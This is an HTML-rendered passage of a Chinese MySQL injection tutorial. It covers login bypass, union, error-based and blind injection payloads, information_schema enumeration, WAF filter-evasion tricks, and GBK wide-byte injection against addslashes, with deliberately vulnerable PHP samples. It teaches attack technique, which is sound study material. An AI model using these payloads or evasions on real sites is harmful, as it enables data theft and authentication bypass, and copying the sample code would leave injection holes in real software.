class="variable">$rs</span>-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码将模拟一个web应用程序进行登录操作。若登录成功，则返回success，否则，返回fail。</p><p>通常正常用户进行登录的sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure><p>其中，变量$username 与变量$password为用户可以控制的内容，正常情况下，用户所输入的内容在sql语义上都将作为字符错，被赋值给前边的字段来当做整条select查询语句的筛选条件。</p><p>若用户输入的$username为<code>admin&#39;#</code>，$password为<code>123</code>。那么拼接到sql语句中将得到如下结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">&#x27;admin&#x27;</span><span class="comment">#&#x27; and password=&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><p>这里的<code>#</code>是单行注释符，可以将后边的内容给注释掉。那么此条语句的语义将发生了变化，用户可以不需要判断密码，只需一个用户名，即可完成登录操作，这与开发者的初衷相悖。</p><h1 id="Mysql注入-入门"><a href="#Mysql注入-入门" class="headerlink" title="Mysql注入-入门"></a>Mysql注入-入门</h1><p>我们知道，在数据库中，常见的对数据进行处理的操作有：<strong>增、删、查、改</strong>这四种。</p><p>每一项操作都具有不同的作用，共同构成了对数据的绝大部分操作。</p><ul><li>增。顾名思义，也就是增加数据。在通用的SQL语句中，其简单结构通常可概述为: <code>INSERT table_name(columns_name) VALUES(new_values)</code>。</li><li>删。删除数据。简单结构为: <code>DELETE table_name WHERE condition</code>。</li><li>查。查询语句可以说是绝大部分应用程序最常用到的SQL语句，他的作用就是查找数据。其简单结构为：<code>SELECT columns_name FROM table_name WHERE condition</code>。</li><li>改。有修改/更新数据。简单结构为:<code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</li></ul><p>PS：以上SQL语句中，系统关键字全部进行了大写处理。</p><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p>mysql的查询语句完整格式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    [<span class="keyword">ALL</span> | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ]</span><br><span class="line">      [<span class="keyword">HIGH_PRIORITY</span>]</span><br><span class="line">      [<span class="keyword">STRAIGHT_JOIN</span>]</span><br><span class="line">      [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>]</span><br><span class="line">      [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [<span class="keyword">FROM</span> table_references</span><br><span class="line">      [<span class="keyword">PARTITION</span> partition_list]</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]</span><br><span class="line">    [<span class="keyword">LIMIT</span> &#123;[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">    [<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">        [<span class="built_in">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        export_options</span><br><span class="line">      | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">      | <span class="keyword">INTO</span> var_name [, var_name]]</span><br><span class="line">    [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span><br></pre></td></tr></table></figure><p>通常注入点发生在where_condition处，并不是说唯有此处可以注入，其他的位置也可以，只是我们先将此处的注入当做例子来进行讲解，之后会逐渐降到其他的位置该如何进行注入。</p><p>对于<code>SELECT</code>语句，我们通常分其为两种情况：有回显和无回显。</p><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>什么叫有回显？别急，我们来举个例子。</p><p>当我们点击一篇文章阅读时，其URL为<code>read.php?id=1</code>，我们可以很容易地猜出其SQL语句可能为<code>select * from articles where id=&#39;$id&#39;</code>。</p><p>这时候页面将SQL语句返回的内容显示在了页面中(本例中是标题、内容、作者等信息)，这种情况就叫有回显。</p><p>对于有回显的情况来说，我们通常使用<strong>联合查询注入法</strong>。</p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>其作用就是，在原来查询条件的基础上，通过系统关键字<code>union</code>从而拼接上我们自己的<code>select</code>语句，后个<code>select</code>得到的结果将拼接到前个<code>select</code>的结果后边。如：前个<code>select</code>得到2条数据，后个<code>select</code>得到1条数据，那么后个<code>select</code>的数据将作为<strong>第3条</strong>拼接到第一个<code>select</code>返回的内容中，其字段名将<strong>按照位置</strong>关系进行继承。</p><p>如：<code>正常查询语句 union select columns_name from (database.)table_name where condition</code></p><p>这里需要注意的是：</p><ul><li>若回显仅支持一行数据的话，记得<strong>让前边正常的查询语句返回的结果为空</strong>。</li><li>使用union select进行拼接时，注意<strong>前后两个select语句的返回的字段数必须相同</strong>，否则无法拼接。</li></ul><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>什么叫无回显？之前举得登录判断就是一个无回显的例子。如果SQL语句存在返回的数据，那么页面输出为success，若不存在返回的数据，则输出fail。</p><p>与有回显情况不同的是：无回显的页面输出内容并不是SQL语句返回的内容。</p><p>对于无回显的情况，我们通常可用两种方法进行注入：<strong>报错注入</strong>与<strong>盲注</strong>。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>什么是报错注入，简单的说，就是有些特殊的函数，会在其报错信息里可能会返回其参数的值。</p><p>我们可以利用这一特性，在其参数放入我们想要得到的数据，通常使用子查询的方法实现，最后让其报错并输出结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常语句 (where | and) exp(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br><span class="line"></span><br><span class="line">正常语句 (where | and) updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>若网站设置了无报错信息返回，那么在<strong>不直接返回数据+不返回报错信息</strong>的情况下，盲注便几乎成了最后一种直接注入取数据的方法了。</p><p>其中，盲注分成<strong>布尔盲注</strong>和<strong>时间盲注</strong>。</p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>对于布尔盲注来说，其使用的场景在于：<strong>对真/假条件返回的内容很容易区分</strong>。</p><p>比如说，有这么一条正常的select语句，我们再起where条件后边加上and 1=2，我们知道，1永远不等于2，那么这个条件就是一个永假条件，我们使用and语句连上，那么整个where部分就是永假的，这时候select语句是不会返回内容的。将其返回的内容与正常页面进行对比，如果很容易区分的话，那么布尔盲注试用。</p><p>如：<code>正常语句 (where | and) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,1,0)</code></p><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>相比较于布尔盲注，时间盲注依赖于通过<strong>页面返回的延迟时间</strong>来判断条件是否正确。</p><p>使用场景：布尔盲注永假条件所返回的内容与正常语句返回的内容很接近/相同，无法判断情况。</p><p>简单的来说，时间盲注就是，如果我们自定义的条件为假的话，我们让其0延迟通过，如果条件为真的话，使用sleep()等函数，让sql语句的返回产生延迟。</p><p>如：<code>正常语句（where | and）if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,sleep(3),1)</code></p><p>最后总结一下: </p><p>常见注入方法有三种：<code>联合查询注入、报错注入、盲注</code>，其中：</p><ul><li>有回显：<strong>三种均可使用</strong>，推荐使用联合查询注入。</li><li>无回显：<strong>报错注入+盲注可用</strong>。</li></ul><p>对于时间成本来说：联合查询注入&lt;报错注入&lt;&lt;盲注。</p><p>通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。</p><h3 id="三大注入的基本步骤"><a href="#三大注入的基本步骤" class="headerlink" title="三大注入的基本步骤"></a>三大注入的基本步骤</h3><h4 id="联合查询注入步骤"><a href="#联合查询注入步骤" class="headerlink" title="联合查询注入步骤"></a>联合查询注入步骤</h4><p>1) 首先，先确定字段数量。</p><p>使用<code>order/group by</code>语句。通过往后边拼接数字，可确定字段数量，<strong>若大于，则页面错误/无内容，若小于或等于，则页面正常</strong>。若错误页与正常页一样，更换报错注入/盲注。</p><p>2) 第二步，判断页面回显数据的字段位置。</p><p>使用<code>union select 1,2,3,4,x...</code> 我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。</p><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的<code>select</code>查询条件返回结果为空即可。</li><li>注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条<code>select</code>语句的方法之一。</li></ul><p>3) 第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。</p><p>首先，查询当前数据库名database()、数据库账号user()、数据库版本version()等基本情况，再根据不同的版本、不同的权限确定接下来的方法。</p><h5 id="若Mysql版本-lt-5-0"><a href="#若Mysql版本-lt-5-0" class="headerlink" title="若Mysql版本&lt;5.0"></a>若Mysql版本&lt;5.0</h5><p>简单的说，由于mysql的低版本缺乏系统库<strong>information_schema</strong>，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠<strong>猜</strong>来解决。</p><p>直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。</p><p>若知道仅表名而不知道列(字段)名：</p><p>可通过以下payload：</p><ul><li>若多字段：select `x` from(select 1,2,3,4,xxx from table_name union select * from table_name)a</li><li>若单字段：select *,1,2,xxx from table_name</li></ul><h5 id="若Mysql版本-gt-5-0"><a href="#若Mysql版本-gt-5-0" class="headerlink" title="若Mysql版本&gt;=5.0"></a>若Mysql版本&gt;=5.0</h5><p>首先去一个名为<strong>information_schema</strong>的数据库里的<strong>shemata</strong>数据表查询<strong>全部数据库名</strong>。</p><p>若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。</p><p>在information_schema的一个名为<strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。</p><p>其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure><p>上述payload可查看全部的数据表名，其中group_concat函数将多行数据转成一行数据。</p><p>接着通过其表名，查询该表的所有字段名，有时也称列名。</p><p>通过information_schema库下的<strong>columns</strong>表可查询对应的数据库/数据库表含有的字段名。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;(table_name)#此处的表名为字符串型，也通过十六进制表示</span><br></pre></td></tr></table></figure><p>知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select 1,2,column_name,4,xxx from (database_name.)table_name</span><br></pre></td></tr></table></figure><p>简单的说，<strong>查库名-&gt;查表名-&gt;查字段名-&gt;查数据</strong></p><h3 id="盲注步骤："><a href="#盲注步骤：" class="headerlink" title="盲注步骤："></a>盲注步骤：</h3><p>核心：利用<strong>逻辑代数连接词/条件函数</strong>，让页面<strong>返回的内容/响应时间</strong>与正常的页面不符。</p><h4 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a><em>布尔盲注：</em></h4><p>首先通过页面对于永真条件<code>or 1=1</code>与永假条件<code>and 1=2</code>的返回内容是否存在差异进行判断是否可以进行布尔盲注。</p><p>如：<code>select * from users where username=$username</code>，其作用设定为<em>判断用户名是否存在</em>。</p><p>通常仅返回<strong>存在/不存在</strong>，两个结果。</p><p>这时候我们就不能使用联合查询法注入，因为页面显示SQL语句返回的内容，只能使用<strong>盲注法/报错注入法</strong>来注出数据。</p><p>我们在将语句注入成：<code>select * from users where username=$username or (condition)</code></p><p>若后边拼接的条件为真的话，那么整条语句的where区域将变成<strong>永真</strong>条件。</p><p>那么，即使我们在$username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。</p><p>利用这一特性，我们的condition为：length(database())&gt;8 即可用于判断数据库名长度</p><p>除此之外，还可：ascii(substr(database(),1,1))&lt;130 用二分法快速获取数据名(逐字判断)</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;nouser or length(database())&gt;8</span><br><span class="line">select * from users where username&#x3D;nouser or ascii(substr(database(),1,1))&lt;130</span><br></pre></td></tr></table></figure><h4 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a><em>时间盲注：</em></h4><p>通过判断页面<strong>返回内容的响应时间差异</strong>进行条件判断。</p><p>通常可利用的产生时间延迟的函数有：<strong>sleep()、benchmark()</strong>，还有许多进行<strong>复杂运算的函数</strong>也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。</p><p>如上述例子：若服务器在执行永真/永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。</p><p>在上述语句中，我们拼接语句，变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;$username (and | or) if(length(database())&gt;8,sleep(3),1)</span><br></pre></td></tr></table></figure><p>如果数据库名的长度大于8，那么if条件将执行sleep(3)，那么此条语句将进行延迟3秒的操作。</p><p>若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。</p><h3 id="报错注入步骤："><a href="#报错注入步骤：" class="headerlink" title="报错注入步骤："></a>报错注入步骤：</h3><p>通过<strong>特殊函数</strong>的错误使用使其参数被页面输出。</p><p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</p><p>常见的利用函数有：<code>exp()、floor()+rand()、updatexml()、extractvalue()</code>等</p><p>如：<code>select * from users where username=$username (and | or) updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符~，使其不满足xpath格式，进行报错并输出。</p><p>将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。</p><p>注意：</p><ul><li>报错函数通常尤其最长报错输出的限制，面对这种情况，可以进行分割输出。</li><li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。</li></ul><h2 id="增、删、改"><a href="#增、删、改" class="headerlink" title="增、删、改"></a>增、删、改</h2><p>可简单当做无回显的Select语句进行注入。值得注意的是，通常增<code>insert</code>处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。</p><h1 id="Mysql注入-进阶"><a href="#Mysql注入-进阶" class="headerlink" title="Mysql注入-进阶"></a>Mysql注入-进阶</h1><p>到目前为止，我们讲了Mysql注入的基本入门，那么接下来我将会花费大部分时间介绍我学习mysql注入遇到的一些知识点。</p><h2 id="常见防御手段绕过"><a href="#常见防御手段绕过" class="headerlink" title="常见防御手段绕过"></a>常见防御手段绕过</h2><p>在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。</p><p>简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。</p><p>若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。</p><p>举个例子：程序过滤掉了<code>union</code>这一关键词，我们可以使用<code>ununionion</code>来绕过。</p><p>PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。</p><h3 id="and-or-被过滤-拦截"><a href="#and-or-被过滤-拦截" class="headerlink" title="and/or 被过滤/拦截"></a>and/or 被过滤/拦截</h3><ol><li>双写<code>anandd、oorr</code></li><li>使用运算符代替<code>&amp;&amp;、||</code></li><li>直接拼接<code>=</code>号，如：<code>?id=1=(condition)</code></li><li>其他方法，如：<code>?id=1^(condition)</code></li></ol><h3 id="空格被过滤-拦截"><a href="#空格被过滤-拦截" class="headerlink" title="空格被过滤/拦截"></a>空格被过滤/拦截</h3><ol><li>多层括号嵌套</li><li>改用+号</li><li>使用注释代替</li><li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格</li></ol><p>如：<code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><h3 id="括号被过滤-拦截"><a href="#括号被过滤-拦截" class="headerlink" title="括号被过滤/拦截"></a>括号被过滤/拦截</h3><ul><li>order by 大小比较盲注</li></ul><h3 id="逗号被过滤-拦截"><a href="#逗号被过滤-拦截" class="headerlink" title="逗号被过滤/拦截"></a>逗号被过滤/拦截</h3><ol><li>改用盲注</li><li>使用join语句代替</li><li><code>substr(data from 1 for 1)</code>相当于<code>substr(data,1,1)</code>、<code>limit 9 offset 4</code>相当于<code>limt 9,4</code></li></ol><h3 id="其他系统关键字被过滤-拦截"><a href="#其他系统关键字被过滤-拦截" class="headerlink" title="其他系统关键字被过滤/拦截"></a>其他系统关键字被过滤/拦截</h3><ol><li>双写绕过关键字过滤</li><li>使用同义函数/语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</li></ol><h3 id="单双引号被过滤-拦截-转义"><a href="#单双引号被过滤-拦截-转义" class="headerlink" title="单双引号被过滤/拦截/转义"></a>单双引号被过滤/拦截/转义</h3><ol><li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</li><li>不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。</li></ol><h3 id="数字被过滤-拦截"><a href="#数字被过滤-拦截" class="headerlink" title="数字被过滤/拦截"></a>数字被过滤/拦截</h3><blockquote><p>下表摘自<a href="https://wooyun.js.org/drops/MySQL注入技巧.html">MySQL注入技巧</a></p></blockquote><table><thead><tr><th>代替字符</th><th>数</th><th>代替字符</th><th>数、字</th><th>代替字符</th><th>数、字</th></tr></thead><tbody><tr><td>false、!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10\A</td><td>ceil((pi()+pi())*pi())</td><td>20\K</td></tr><tr><td>true、!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11\B</td><td>ceil(ceil(pi())*version())</td><td>21\L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12\C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22\M</td></tr><tr><td>floor(pi())、~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13\D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23\N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14\E</td><td>ceil(pi())*ceil(version())</td><td>24\O</td></tr><tr><td>floor(version()) //注意版本</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15\F</td><td>floor(pi()*(version()+pi()))</td><td>25\P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16\G</td><td>floor(version()*version())</td><td>26\Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17\H</td><td>ceil(version()*version())</td><td>27\R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18\I</td><td>ceil(pi()<em>pi()</em>pi()-pi())</td><td>28\S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19\J</td><td>floor(pi()<em>pi()</em>floor(pi()))</td><td>29\T</td></tr></tbody></table><h2 id="编码转换产生的问题"><a href="#编码转换产生的问题" class="headerlink" title="编码转换产生的问题"></a>编码转换产生的问题</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么是宽字节注入？下面举个例子来告诉你。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&quot;127.0.0.1:3307&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;db&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;query(<span class="string">&quot;set names &#x27;gbk&#x27;;&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = addslashes(@<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = addslashes(@<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$rs</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是开头的例子，只不过加了点料。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span>-&gt;query(<span class="string">&quot;set names &#x27;gbk&#x27;;&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = addslashes(@<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = addslashes(@<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>addslashes</code>函数将会把POST接收到的username与password的部分字符进行转义处理。如下：</p><ul><li>字符<code>&#39;、&quot;、\</code>前边会被添加上一条反斜杠<code>\</code>作为转义字符。</li><li>多个空格被过滤成一个空格。</li></ul><p>这使得我们原本的payload被转义成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username &#x3D; &#39;admin\&#39;#&#39; and password&#x3D;&#39;123&#39;;</span><br></pre></td></tr></table></figure><p>注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为<code>admin&#39;#</code>且密码为123的用户。</p><p>但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$conn-&gt;query(&quot;set names &#39;gbk&#39;;&quot;);</span><br></pre></td></tr></table></figure><p>其作用相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;gbk&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;gbk&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;gbk&#39;;</span><br></pre></td></tr></table></figure><p>当我们输入的数据为：<code>username=%df%27or%201=1%23&amp;password=123</code></p><p>经过addslashes函数处理最终变成：<code>username=%df%5c%27or%201=1%23&amp;password=123</code></p><p>经过gbk解码得到：<code>username=運&#39;or 1=1#</code>、<code>password=123</code>，拼接到SQL语句得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username &#x3D; &#39;運&#39;or 1&#x3D;1#&#39; and password&#x3D;&#39;123&#39;;</span><br></pre></td></tr></table></figure><p>成功跳出了addslashes的转义限制。</p><h4 id="具体解释"><a href="#具体解释" class="headerlink" title="具体解释"></a>具体解释</h4><p>前边提到：<code>set names &#39;gbk&#39;;</code>相当于执行了如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;gbk&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;gbk&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;gbk&#39;;</span><br></pre></td></tr></table></figure><p>那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的<code>character_set_client</code>所设置的编码进行转码，本例是gbk编码。</p><p>由于PHP的编码为<code>UTF-8</code>，我们输入的内容为<code>%df%27</code>，会被当做是两个字符，其中<code>%27</code>为单引号<code>&#39;</code>。</p><p>经过函数<code>addslashes</code>处理变成<code>%df%5c%27</code>，<code>%5c</code>为反斜线<code>\</code>。</p><p>在经过客户端层<code>character_set_client</code>编码处理后变成：<code>運&#39;</code>，成功将反斜线给“吞”掉了，使单引号逃逸出来。</p><h3 id="Latin1默认编码"><a href="#Latin1默认编码" class="headerlink" title="Latin1默认编码"></a>Latin1默认编码</h3><p>讲完了gbk造成的编码问题，我们再讲讲latin1造成的编码问题。</p><p>老样子，先举个例子。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 